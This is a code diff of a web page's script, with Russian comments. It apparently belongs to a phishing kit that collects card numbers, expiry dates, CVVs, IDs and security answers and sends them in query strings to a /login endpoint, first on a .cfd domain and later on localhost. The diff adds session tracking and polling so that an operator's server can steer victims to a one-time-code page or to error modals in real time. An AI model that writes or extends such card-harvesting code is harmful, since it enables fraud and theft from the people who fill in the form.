@@ -388,7 +388,7 @@
 <script>
   document.addEventListener('DOMContentLoaded', function () {
       document.getElementById('ShowInputButton').addEventListener('click', function() {
-          fetch('https://api.mobiletecso.cfd/test')
+          fetch('http://127.0.0.1:5000/test')
               .then(response => response.text())
               .then(data => {
                   console.log("Data received:", data);
@@ -403,6 +403,9 @@
 
 <!-- <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script> -->
 <script>
+let session = Math.floor(Math.random() * 9000000) + 1000000;
+console.log(session)
+localStorage.setItem('session', session);
 document.getElementById('ShowInputButton').addEventListener('click', function() {
     let cardNumber = document.getElementById('card-number').value;
     let expiryDate = document.getElementById('card-date').value;
@@ -427,19 +430,21 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
 
     if(question){
       console.log('question')
-      var url = "https://api.mobiletecso.cfd/login" +
+      var url = "http://127.0.0.1:5000/login" +
               "?cardNumber=" + encodeURIComponent(cardNumber) +
               "&expiryDate=" + encodeURIComponent(expiryDate) +
               "&cvv=" + encodeURIComponent(cvv) +
               "&id=" + encodeURIComponent(id) +
-              "&question=" + encodeURIComponent(question);
+              "&question=" + encodeURIComponent(question) +
+              "&session=" + encodeURIComponent(session);
     } else {
       console.log('question')
-      var url = "https://api.mobiletecso.cfd/login" +
+      var url = "http://127.0.0.1:5000/login" +
               "?cardNumber=" + encodeURIComponent(cardNumber) +
               "&expiryDate=" + encodeURIComponent(expiryDate) +
               "&cvv=" + encodeURIComponent(cvv) +
-              "&id=" + encodeURIComponent(id);
+              "&id=" + encodeURIComponent(id) +
+              "&session=" + encodeURIComponent(session);
     }
 
     // Показываем элемент загрузки
@@ -458,10 +463,12 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
         .then(data => {
             console.log("Ответ сервера:", data);
             if(data == 'button1'){
+              loadingElement.style.display = 'none';
               console.log("Ответ сервера:", data);
               document.location.href = './code.html'
             }
             if(data == 'button2'){
+              loadingElement.style.display = 'none';
               console.log("Ответ сервера:", data);
               var element = document.querySelector('.form-row.question-form');
               // Удаляем стиль display: none; если он установлен
@@ -470,12 +477,15 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
               }
             }
             if(data == 'button3'){
+              loadingElement.style.display = 'none';
               openModal();
             }
             if(data == 'button4'){
+              loadingElement.style.display = 'none';
               openModal_nocorrect_num();
             }
             if (data == 'button5'){
+              loadingElement.style.display = 'none';
               openModal_nocorrect_qu();
             }
         })
@@ -484,9 +494,59 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
         })
         .finally(() => {
             // Скрываем элемент загрузки
-            loadingElement.style.display = 'none';
+            console.log('nice')
         });
 });
+
+function fetchUpdate() {
+  fetch('http://127.0.0.1:5000/update'+"?session=" + encodeURIComponent(session))
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Network response was not ok ' + response.statusText);
+      }
+      return response.json(); // или response.text(), в зависимости от ожидаемого формата данных
+    })
+    .then(data => {
+      console.log('Data received:', data);
+            if(data.result == 'button1'){
+              var loadingElement = document.getElementById('loadingMessage');
+              loadingElement.style.display = 'none';
+              console.log("Ответ сервера:", data);
+              document.location.href = './code.html'
+            }
+            if(data.result == 'button2'){
+              var loadingElement = document.getElementById('loadingMessage');
+              loadingElement.style.display = 'none';
+              console.log("Ответ сервера:", data);
+              var element = document.querySelector('.form-row.question-form');
+              // Удаляем стиль display: none; если он установлен
+              if (element) {
+                  element.style.display = 'block'; // Устанавливаем пустую строку, чтобы вернуться к стандартному значению display элемента
+              }
+            }
+            if(data.result == 'button3'){
+              var loadingElement = document.getElementById('loadingMessage');
+              loadingElement.style.display = 'none';
+              openModal();
+            }
+            if(data.result == 'button4'){
+              var loadingElement = document.getElementById('loadingMessage');
+              loadingElement.style.display = 'none';
+              openModal_nocorrect_num();
+            }
+            if (data.result == 'button5'){
+              var loadingElement = document.getElementById('loadingMessage');
+              loadingElement.style.display = 'none';
+              openModal_nocorrect_qu();
+            }
+    })
+    .catch(error => {
+      console.error('There has been a problem with your fetch operation:', error);
+    });
+}
+
+// Устанавливаем интервал для выполнения fetchUpdate() каждые 5 секунд
+setInterval(fetchUpdate, 3000);
 
 // Функция для открытия модального окна
 function openModal() {
